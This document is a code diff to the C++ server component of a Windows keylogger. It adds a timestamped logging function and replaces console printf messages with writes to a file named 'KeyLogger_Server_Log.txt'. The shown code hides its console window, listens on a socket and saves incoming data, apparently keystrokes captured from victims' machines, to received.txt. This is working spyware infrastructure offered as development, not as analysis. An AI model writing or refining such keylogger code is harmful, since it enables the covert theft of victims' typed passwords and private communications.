@@ -19,9 +19,25 @@ void Stealth() //HIDES CONSOLE
     ShowWindow(Stealth,0);
 }
 
+void LogIntoFile(std::string input, bool timeStamp, std::string logFileType) //BASIC LOG FUNCTION
+{
+    std::ofstream logFileS;
+    logFileS.open(logFileType, std::ios_base::app);
+    if(timeStamp)
+    {
+        time_t timeNow = time(0);
+        tm *time = localtime(&timeNow);
+        logFileS << "[" << time->tm_mday << "/" << 1 + time->tm_mon << "/" << 1900 + time->tm_year << " - " << time->tm_hour << ":" << time->tm_min << ":" << time->tm_sec << "] " << input << std::endl;
+    }
+    else
+    {
+        logFileS << input;
+    }
+    logFileS.close();
+}
+
 int Socket()
 {
-    
     while(1)
     {
         WSADATA wsaData;
@@ -38,14 +54,14 @@ int Socket()
 
         if(serverSocket == INVALID_SOCKET)
         {
-            printf("Server: socket() failed! Error code: %ld\n", WSAGetLastError());
+            LogIntoFile("Error: socket() failed: " + std::to_string(WSAGetLastError()),true,"KeyLogger_Server_Log.txt");
             WSACleanup();
             Sleep(100);
             continue;
         }
         else
         {
-            printf("Server: socket() is OK!\n");
+            LogIntoFile("Socket() is OK!",true,"KeyLogger_Server_Log.txt");
         }
         
         ServerAddr.sin_family = AF_INET;
@@ -54,7 +70,7 @@ int Socket()
 
         if(bind(serverSocket,(sockaddr *)&ServerAddr,sizeof(ServerAddr)) == SOCKET_ERROR)
         {
-            printf("Server: bind() failed! Error code: %ld.\n", WSAGetLastError());
+            LogIntoFile("Error: bind() failed: " + std::to_string(WSAGetLastError()),true,"KeyLogger_Server_Log.txt");
             closesocket(serverSocket);
             WSACleanup();
             Sleep(100);
@@ -62,12 +78,12 @@ int Socket()
         }
         else
         {
-            printf("Server: bind() is OK!\n");
+            LogIntoFile("Bind() is OK!",true,"KeyLogger_Server_Log.txt");
         }
         
         if(listen(serverSocket, 5) == SOCKET_ERROR)
         {
-            printf("Server: listen(): Error listening on socket %ld.\n", WSAGetLastError());
+            LogIntoFile("Error: listen() failed: " + std::to_string(WSAGetLastError()),true,"KeyLogger_Server_Log.txt");
             closesocket(serverSocket);
             WSACleanup();
             Sleep(100);
@@ -75,7 +91,7 @@ int Socket()
         }
         else
         {
-            printf("Server: listening for incomming connections...\n");
+            LogIntoFile("listen() ok and listening for incomming connections",true,"KeyLogger_Server_Log.txt");
         }
 
         while(1)
@@ -84,44 +100,50 @@ int Socket()
             while(newConnection == SOCKET_ERROR)
             {
                 newConnection = accept(serverSocket, NULL, NULL);
-                printf("\nServer: accept() is OK...\n");
-                printf("Server: New client got connected, ready to receive and send data...\n");
+                if(newConnection != INVALID_SOCKET)
+                {
+                    LogIntoFile("accept() is OK ready to receive and send data",true,"KeyLogger_Server_Log.txt");
+                }
+                else
+                {
+                    LogIntoFile("Error: accept() failed: " + std::to_string(WSAGetLastError()),true,"KeyLogger_Server_Log.txt");
+                }
                 std::ofstream logFileS;
                 logFileS.open("received.txt", std::ios_base::app | std::ios::binary);
                 while(1)
                 {
                     if(ByteReceived = recv(newConnection, recvbuff, sizeof(recvbuff), 0) > 0)
                     {
-                        printf("Received: %s", recvbuff);
+                        //LogIntoFile("Receiving data from client!",true,"KeyLogger_Server_Log.txt");
                         logFileS << recvbuff << std::endl;
                         memset(recvbuff, 0, sizeof recvbuff);
                         Sleep(10);
                     }
                     else if(ByteReceived == SOCKET_ERROR)
                     {
-                        printf("Server: recv() failed with error code: %d\n", WSAGetLastError());
+                        LogIntoFile("Error: recv() failed: " + std::to_string(WSAGetLastError()),true,"KeyLogger_Server_Log.txt");
                         break;
                     }
                     else
                     {
-                        printf("NO DATA");
+                        LogIntoFile("Warning: No data received!",true,"KeyLogger_Server_Log.txt");
                         break;
                     }
                 }
 
                 logFileS.close();
-                printf("File closed and received!");
+                LogIntoFile("File closed and received!",true,"KeyLogger_Server_Log.txt");
                 
                 if( shutdown(newConnection, SD_SEND) != 0)
                 {
-                    printf("\nServer: Well, there is something wrong with the shutdown(). The error code: %ld\n", WSAGetLastError());
+                    LogIntoFile("Warning: shutdown() failed: " + std::to_string(WSAGetLastError()),true,"KeyLogger_Server_Log.txt");
                     closesocket(serverSocket);
                     WSACleanup();
                     break;
                 }
                 else
                 {
-                    printf("\nServer: shutdown() looks OK...\n");
+                    LogIntoFile("shutdown() looks OK",true,"KeyLogger_Server_Log.txt");
                     closesocket(serverSocket);
                     WSACleanup();
                     break;
@@ -131,6 +153,7 @@ int Socket()
         break;
         }
     }
+    return 0;
 }
 
 int main(int argc, char const *argv[])
